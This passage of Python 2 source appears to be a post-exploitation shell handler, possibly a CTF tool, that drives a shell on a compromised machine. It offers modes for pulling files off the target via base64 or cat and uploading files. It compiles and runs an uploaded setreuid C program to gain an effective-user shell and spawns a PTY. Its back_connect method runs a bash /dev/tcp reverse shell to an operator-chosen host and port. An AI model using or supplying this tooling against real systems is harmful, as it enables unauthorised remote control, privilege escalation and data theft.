        print 'SIGNAL %d received\n' % signum
        if self.wait:
            self.wait = False
        else:
            exit()

    def select(self):
        self.cmn.read_all()
        self.enable = {'base64':None, 'python':None, 'gcc':None}

        sys.stdout.write('[A]dvanced\t[N]ormal\t[I]nteractive\t[R]everseShell\n[S]tatus\t[E]xit\n')
        while self.cmn.is_alive:
            mode = '' 
            while mode not in ('a','n','i','r','s','e'):
                mode = raw_input('(A/N/I/R/S/E)...').lower()
            
            if mode == 'a':
                self.advanced()
            elif mode == 'n':
                self.normal()
            elif mode == 'i':
                self.interact()
            elif mode == 'r':
                self.back_connect()
            elif mode == 's':
                self.status()
            elif mode == 'e':
                break

            sys.stdout.write('\n')

    def command(self,cmd = '', user = False):
        cmn = self.cmn
        if len(cmd)>0:
            cmn.sendln(cmd + ((' 2>&1; echo __END_%s__' % self.token) if user else ''))

        if user:
            rsp = ''
            self.wait = True
            while self.wait:
                rsp = cmn.read_until().split(('__END_%s__' % self.token))
                sys.stdout.write(rsp[0])
                if len(rsp)>1:
                    break
        else:
            return cmn.read_all()
            
    def is_implemented(self, pname):
        if self.enable[pname] is None or self.enable[pname]==False:
            which = self.command('which %s' % pname)
            enable = which and '/'+pname in which
            if enable:
                info('%s is implemented' % pname)
            else:
                fail('%s is not implemented' % pname)

            self.enable[pname] = enable
        return self.enable[pname]
    
    def status(self):
        sys.stdout.write('Status\n')
        disable = []
        for pname in self.enable:
            if self.enable[pname]:
                info(pname)
            else:
                disable += [pname]
                if self.enable[pname] is None:
                    warn(pname)
                else:
                    fail(pname)

        if disable and raw_input('Recheck?(y/n)').lower()=='y':
            for pname in disable:
                self.is_implemented(pname)

    def download(self,fpath = '*'):
        dname = fpath[:fpath.rfind('/')+1]
        if len(dname)==0:
            dname = './'
        
        files = self.command('ls %s || echo "Error"' % (dname+fpath.split('/')[-1])).split('\n')
            
        if 'Error' not in files:
            for fpath in files:
                if dname in fpath and ':' not in fpath:
                    fname = fpath.split('/')[-1]
                    proc('Downloading "%s" ...' % fpath)
                    
                    data = ''
                    if self.is_implemented('base64'):
                        enc_data = self.command('base64 %s 2>&1 || echo "Error"' % fpath)
                        if 'Error' in enc_data:
                            fail(enc_data.split('\n')[0])
                        else:
                            data = b64decode(enc_data)
                    else:
                        data = self.command('cat %s' % fpath)                  
                        
                    if len(data)>0:
                        open(fname,'wb').write(data)
                        info('"%s" download succeeded!\n' % fname)
                    else:
                        fail('"%s" download failed...\n' % fname)
        else:
            fail('"%s" does not exist' % fpath)

    def upload(self, fname, data=None):
        if data is None:
            data = open(fname,'rb').read()
        fname = fname.split('/')[-1]

        if self.is_implemented('base64'):
            enc_data = b64encode(data)
            rsp = self.command('echo %s | base64 -d > %s' % (enc_data,fname))
        elif self.is_implemented('timeout'):
            rsp = self.command('timeout 2 cat > %s; echo Terminated' % fname)
            self.cmn.send(data)
            self.cmn.read_until('Terminated\n')

        if rsp is not None and len(rsp)==0:
            info('"%s" upload succeeded!\n' % fname)
        else:
            fail('"%s" upload failed...\n' % fname)
            
    def advanced(self):
        whoami = self.command('whoami').split('\n')[0]
        if 'whoami:' in whoami:
            whoami = '********'
        hostname = self.command('hostname').split('\n')[0]
        pwd = self.command('pwd').split('\n')[0]

        while True:
            cmd = raw_input('[%s@%s:%s]$ ' % (whoami,hostname,pwd))
            
            pgm = cmd.split(' ')
            if pgm[0]=='GET':
                if len(pgm)>1:
                    self.download(pgm[1])
                else:
                    warn('GET <file name>')
            elif pgm[0]=='PUT':
                if len(pgm)>1:
                    self.upload(pgm[1])
                else:
                    warn('PUT <file name>')
            elif pgm[0]=='REVERSE':
                self.back_connect((pgm[1],int(pgm[2])) if len(pgm)>2 else None)
            elif 'cd ' in cmd:
                self.command(cmd)
                pwd = self.command('pwd')[:-1]
            elif pgm[0] in ('exit','MODE'):
                break
            else:
                self.command(cmd,True)

        if pgm[0]=='exit':
            self.cmn.is_alive = False

    def normal(self):
        while True:
            cmd = raw_input("$")
            if cmd in ('exit','MODE'):
                break
            else:
                self.command(cmd,True)

        if cmd=='exit':
            self.cmn.is_alive = False
        
    def interact(self):
        if self.is_implemented('python') and raw_input('Need TTY?(y/n)').lower()=='y':
            get_tty = True
            if 'euid' in self.command('id'):
                if self.is_implemented('gcc') and self.is_implemented('base64'):
                    setreuid = '#include<stdlib.h>\n#include<unistd.h>\nmain(){setreuid(geteuid(),-1);execl("/bin/sh","/bin/sh",NULL);}'
                    self.command('cd /tmp')
                    self.upload('setreuid.c', setreuid)
                    self.command('gcc setreuid.c -o setreuid && ./setreuid; exit')
                    self.command('cd - > /dev/null')
        else:
            get_tty = False
            

        if get_tty:
            shells = []
            sleep(0.5)
            for s in self.command('cat /etc/shells').split('\n'):
                if s and s[0]=='/':
                    shells += [s]
                    sys.stdout.write('%d : %s\n' % (len(shells), s))

            if len(shells)>0:
                shell_no = 0
                while shell_no <= 0 or shell_no > len(shells):
                    shell_no = raw_input('>>')
                    shell_no = int(shell_no) if shell_no.isdigit() else 0
            else:
                shell_no = 1
                shells = ['/bin/sh']
                
            self.command('TERM=cygwin python -c \'import pty; pty.spawn("%s")\'; exit' % shells[shell_no-1])
            sleep(0.5)
            get_tty = 'not a tty' not in self.command('tty')
        
        Interact(self.cmn).worker(get_tty)

    def back_connect(self,hp = None):
        if(hp is None):
            tmp = raw_input('Input host "Addr:Port"(Enter:deafult)>>')
            if ':' in tmp:
                tmp = tmp.split(':')
                hp = (tmp[0],int(tmp[1]))
            else:
                hp = lhp
            
        info('Back Connect to %s:%d\n' % hp)
        self.command('/bin/bash -c "bash -i >& /dev/tcp/%s/%d 0>&1 &"' % hp)

    def __del__(self):
        self.cmn.sendln('exit')

#==========
                
class Interact:
    def __init__(self, cmn):
        self.cmn = cmn

    def worker(self, tty=False):
        if not tty:
            fail('Not a TTY')
            
        start_new_thread(self.listener, ())
        self.sender(tty)
        
    def sender(self, tty):
        if tty:
            import curses
            
            self.stdscr = curses.initscr()
            curses.noecho()
            curses.cbreak()
            self.stdscr.keypad(True)
            
        keypad = {  'KEY_BACKSPACE' :'\x7f',
                    'KEY_UP'        :'\x1b\x5b\x41',
                    'KEY_DOWN'      :'\x1b\x5b\x42',
                    'KEY_RIGHT'     :'\x1b\x5b\x43',
                    'KEY_LEFT'      :'\x1b\x5b\x44',
                    'KEY_HOME'      :'\x1b\x5b\x31\x7e',
                    'KEY_IC'        :'\x1b\x5b\x32\x7e',
                    'KEY_DC'        :'\x1b\x5b\x33\x7e',
                    'KEY_END'       :'\x1b\x5b\x34\x7e',
                    'KEY_PPAGE'     :'\x1b\x5b\x35\x7e',
                    'KEY_NPAGE'     :'\x1b\x5b\x36\x7e'}

        while self.cmn.is_alive:
            key = self.stdscr.getkey() if tty else sys.stdin.readline()
            self.cmn.send(keypad[key] if key in keypad else key)

        if tty:
            self.stdscr.keypad(False)
            curses.nocbreak()
            curses.echo()
            curses.endwin()

    def listener(self):
        while self.cmn.is_alive:
            rsp = self.cmn.read(512)
            if rsp:
                sys.stdout.write(rsp)
            
#==========
